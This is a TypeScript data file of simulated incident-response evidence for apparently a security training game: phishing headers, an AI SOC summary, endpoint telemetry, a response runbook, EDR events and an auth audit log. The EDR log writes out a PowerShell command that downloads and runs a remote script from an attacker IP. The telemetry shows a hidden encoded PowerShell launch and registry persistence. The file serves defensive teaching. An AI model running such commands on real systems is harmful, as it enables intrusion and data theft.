export type EvidenceFormat = "txt" | "json" | "csv" | "log";

export type EvidenceText = {
  filename: string;
  format: EvidenceFormat;
  content: string;
};

// Live text content for TXT / JSON / CSV evidence files.
// Rendered in the VS Code style viewer (no screenshots).
export const EVIDENCE_TEXT: Record<string, EvidenceText> = {
  // -------- Operation PhishNet --------
  headers: {
    filename: "email-headers.txt",
    format: "txt",
    content: `Return-Path: <payroll-noreply@payroll-secure-verify.com>
Received: from mx-inbound.corp.local (10.24.8.12) by mail.corp.local
        with Microsoft SMTP Server id 15.2.986.9; Tue, 04 Feb 2026 09:14:22 -0600
Received: from smtp.payroll-secure-verify.com (185.216.71.42)
        by mx-inbound.corp.local with ESMTPS id A83F1;
        Tue, 04 Feb 2026 09:14:21 -0600
Authentication-Results: mx-inbound.corp.local;
        spf=fail (sender IP is 185.216.71.42) smtp.mailfrom=payroll-secure-verify.com;
        dkim=none (message not signed);
        dmarc=fail action=quarantine header.from=corp-payroll.com
Received-SPF: fail (mx-inbound.corp.local: domain of payroll-secure-verify.com
        does not designate 185.216.71.42 as permitted sender)
From: "Corporate Payroll" <no-reply@corp-payroll.com>
Reply-To: hr-verify@payroll-secure-verify.com
To: employee@corp.local
Subject: [ACTION REQUIRED] Verify Your Payroll Information
Date: Tue, 4 Feb 2026 09:14:20 -0600
Message-ID: <a83f1c72-payroll-verify@payroll-secure-verify.com>
MIME-Version: 1.0
Content-Type: multipart/alternative;
        boundary="----=_NextPart_000_00A2_01D9F7B2.5C4E6210"
X-Mailer: PHPMailer 6.7.1 (https://github.com/PHPMailer/PHPMailer)
X-Originating-IP: [185.216.71.42]
X-Priority: 1 (Highest)
List-Unsubscribe: <mailto:unsub@payroll-secure-verify.com>
`,
  },

  // -------- AI Defender --------
  "ai-summary": {
    filename: "ai-summary.txt",
    format: "txt",
    content: `AI SOC ASSISTANT — INVESTIGATION SUMMARY
=========================================
Host: WKST-FIN-014
Analyst: ai-assistant@soc
Generated: 2026-02-05T14:22:07Z
Confidence: 82%

Summary
-------
Endpoint WKST-FIN-014 exhibited a suspicious process chain originating
from a Microsoft Office application. WINWORD.EXE spawned powershell.exe
with an encoded command, which subsequently spawned rundll32.exe. The
host initiated an outbound TLS connection to 45.147.230.19:443 shortly
after execution. This pattern matches known "living-off-the-land" loader
behavior consistent with commodity malware families.

Key Findings
------------
- Parent/child chain: WINWORD.EXE -> powershell.exe -> rundll32.exe
- Encoded PowerShell command line (~2.1 KB, base64)
- Beacon-like outbound traffic to 45.147.230.19 every 60s
- ~14 MB uploaded to external IP over a 4-minute window
- No matching allow-list entry for rundll32.exe loading %APPDATA%\\d.dat

10 Recommended Actions
----------------------
 1. Isolate WKST-FIN-014 from the network immediately.
 2. Suspend the affected user account and force credential reset.
 3. Capture volatile memory before power state changes.
 4. Block 45.147.230.19 at the perimeter firewall and web proxy.
 5. Hunt for the same parent/child chain across the fleet.
 6. Search for the file hash of d.dat in EDR telemetry.
 7. Pull mail logs for the originating document delivery vector.
 8. Preserve endpoint logs (Sysmon, PowerShell, Security) for IR.
 9. Notify the incident commander and open a ticket in the IR queue.
10. Schedule a full forensic image once the host is contained.
`,
  },
  "host-telemetry": {
    filename: "host-telemetry.json",
    format: "json",
    content: `{
  "host": "WKST-FIN-014",
  "user": "j.morgan",
  "os": "Windows 11 Pro 23H2",
  "collected_at": "2026-02-05T14:20:11Z",
  "events": [
    { "id": 1, "ts": "14:02:11", "type": "process_start", "name": "WINWORD.EXE", "pid": 4820, "ppid": 812 },
    { "id": 2, "ts": "14:02:47", "type": "file_open", "path": "C:\\\\Users\\\\j.morgan\\\\Downloads\\\\invoice_feb.docm" },
    { "id": 3, "ts": "14:02:49", "type": "macro_enabled", "doc": "invoice_feb.docm" },
    { "id": 4, "ts": "14:02:50", "type": "process_start", "name": "powershell.exe", "pid": 6012, "ppid": 4820,
      "cmdline": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC..." },
    { "id": 5, "ts": "14:02:52", "type": "file_write", "path": "C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat", "size": 184320 },
    { "id": 6, "ts": "14:02:53", "type": "process_start", "name": "rundll32.exe", "pid": 6288, "ppid": 6012,
      "cmdline": "rundll32.exe C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat,Start" },
    { "id": 7, "ts": "14:02:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 8, "ts": "14:03:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 9, "ts": "14:04:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 10, "ts": "14:05:12", "type": "file_read", "path": "C:\\\\Users\\\\j.morgan\\\\Documents\\\\finance\\\\Q4-forecast.xlsx" },
    { "id": 11, "ts": "14:05:13", "type": "file_read", "path": "C:\\\\Users\\\\j.morgan\\\\Documents\\\\finance\\\\payroll-Q1.xlsx" },
    { "id": 12, "ts": "14:05:22", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 3145728 },
    { "id": 13, "ts": "14:06:41", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 5242880 },
    { "id": 14, "ts": "14:08:02", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 6291456 },
    { "id": 15, "ts": "14:09:14", "type": "registry_set", "key": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",
      "value": "rundll32.exe C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat,Start" }
  ],
  "indicators": {
    "processes": ["WINWORD.EXE", "powershell.exe", "rundll32.exe"],
    "files": ["invoice_feb.docm", "d.dat"],
    "network": ["45.147.230.19:443"],
    "persistence": ["HKCU\\\\...\\\\Run\\\\Updater"]
  }
}
`,
  },

  // -------- Incident Zero --------
  "ir-runbook": {
    filename: "ir-runbook.txt",
    format: "txt",
    content: `INCIDENT RESPONSE RUNBOOK — Lateral Movement Detected
=====================================================
Severity: HIGH
Playbook: PB-IR-014
Owner:    SOC Tier-2

Phase 1 — Preparation
  [x] Contact list validated
  [x] IR tooling deployed to all endpoints
  [x] Backup verified within last 24h

Phase 2 — Identification
  [x] EDR alert triaged (rule: T1021.002 SMB/Windows Admin Shares)
  [x] Patient zero identified: HR-LT-032
  [x] Impacted assets enumerated (see edr-events.json)
  [ ] Threat actor TTPs mapped to MITRE ATT&CK

Phase 3 — Containment
  [ ] Isolate HR-LT-032 (network quarantine)
  [ ] Disable compromised service account: svc-backup
  [ ] Block C2 IPs at perimeter: 194.180.48.71, 45.132.192.14
  [ ] Rotate credentials for privileged accounts touched by HR-LT-032

Phase 4 — Eradication
  [ ] Remove persistence (Scheduled Task \\\\Microsoft\\\\Windows\\\\UpdateHost)
  [ ] Delete dropped binary C:\\\\ProgramData\\\\svc\\\\host.exe
  [ ] Patch CVE-2025-31200 on all Windows 10 endpoints

Phase 5 — Recovery
  [ ] Restore HR-LT-032 from clean image
  [ ] Re-enable service account after rotation
  [ ] Monitor for 72h with elevated alerting

Phase 6 — Lessons Learned
  [ ] Post-incident review scheduled within 5 business days
  [ ] Update detection rules and share IOCs with peers

Escalation
----------
- Tier-3 pager:  +1-555-0100
- IR commander:  ir-lead@corp.local
- Legal / Comms: legal-oncall@corp.local
`,
  },
  "edr-events": {
    filename: "edr-events.json",
    format: "json",
    content: `{
  "tenant": "corp",
  "generated_at": "2026-02-06T08:11:44Z",
  "events": [
    { "id": "e-1001", "ts": "07:12:03", "host": "HR-LT-032", "user": "a.patel", "type": "logon", "logon_type": 10, "src_ip": "10.24.12.44" },
    { "id": "e-1002", "ts": "07:14:22", "host": "HR-LT-032", "type": "process", "name": "powershell.exe",
      "cmdline": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://194.180.48.71/s.ps1')" },
    { "id": "e-1003", "ts": "07:14:26", "host": "HR-LT-032", "type": "network", "dst_ip": "194.180.48.71", "dst_port": 80, "bytes_out": 812 },
    { "id": "e-1004", "ts": "07:14:31", "host": "HR-LT-032", "type": "file_write", "path": "C:\\\\ProgramData\\\\svc\\\\host.exe", "sha256": "b5c3...9ef1" },
    { "id": "e-1005", "ts": "07:15:02", "host": "HR-LT-032", "type": "scheduled_task_create",
      "name": "\\\\Microsoft\\\\Windows\\\\UpdateHost", "action": "C:\\\\ProgramData\\\\svc\\\\host.exe" },
    { "id": "e-1006", "ts": "07:18:11", "host": "HR-LT-032", "type": "auth", "action": "kerberos_tgs", "target_spn": "cifs/FS-01.corp.local", "account": "svc-backup" },
    { "id": "e-1007", "ts": "07:19:44", "host": "FS-01", "type": "smb_session", "src_ip": "10.24.12.44", "share": "\\\\FS-01\\\\C$", "account": "svc-backup" },
    { "id": "e-1008", "ts": "07:20:12", "host": "FS-01", "type": "file_write", "path": "C:\\\\Windows\\\\Temp\\\\host.exe", "sha256": "b5c3...9ef1" },
    { "id": "e-1009", "ts": "07:20:22", "host": "FS-01", "type": "service_create", "name": "UpdateHost", "binpath": "C:\\\\Windows\\\\Temp\\\\host.exe" },
    { "id": "e-1010", "ts": "07:24:03", "host": "FS-01", "type": "network", "dst_ip": "45.132.192.14", "dst_port": 443, "bytes_out": 4096 },
    { "id": "e-1011", "ts": "07:31:18", "host": "DC-01", "type": "auth", "action": "kerberos_as", "account": "svc-backup", "src_ip": "10.24.12.44" },
    { "id": "e-1012", "ts": "07:31:44", "host": "DC-01", "type": "dcsync_suspected", "account": "svc-backup", "src_ip": "10.24.12.44" }
  ],
  "indicators": {
    "hashes": ["b5c3...9ef1"],
    "ips": ["194.180.48.71", "45.132.192.14"],
    "accounts": ["svc-backup"],
    "hosts": ["HR-LT-032", "FS-01", "DC-01"]
  }
}
`,
  },
  "auth-audit": {
    filename: "auth-audit.csv",
    format: "csv",
    content: `timestamp,user,host,event,result,src_ip,notes
2026-02-06T07:12:03Z,a.patel,HR-LT-032,interactive_logon,success,10.24.12.44,normal working hours
2026-02-06T07:14:22Z,a.patel,HR-LT-032,process_execution,success,10.24.12.44,powershell encoded
2026-02-06T07:18:11Z,svc-backup,HR-LT-032,tgs_request,success,10.24.12.44,SPN cifs/FS-01
2026-02-06T07:19:44Z,svc-backup,FS-01,network_logon,success,10.24.12.44,SMB session
2026-02-06T07:20:22Z,svc-backup,FS-01,service_install,success,10.24.12.44,UpdateHost
2026-02-06T07:31:18Z,svc-backup,DC-01,kerberos_ticket,success,10.24.12.44,anomalous src
2026-02-06T07:31:44Z,svc-backup,DC-01,dcsync,suspected,10.24.12.44,replication rights abused
2026-02-06T07:44:02Z,svc-backup,DC-01,ldap_query,success,10.24.12.44,enumerated domain admins
2026-02-06T08:02:19Z,svc-backup,FS-01,file_read,success,10.24.12.44,accessed \\\\Finance\\\\
2026-02-06T08:05:41Z,svc-backup,FS-01,file_read,success,10.24.12.44,accessed \\\\HR\\\\payroll
`,
  },

  // Final Hunt evidence is rendered as static screenshot images, not live text.
};

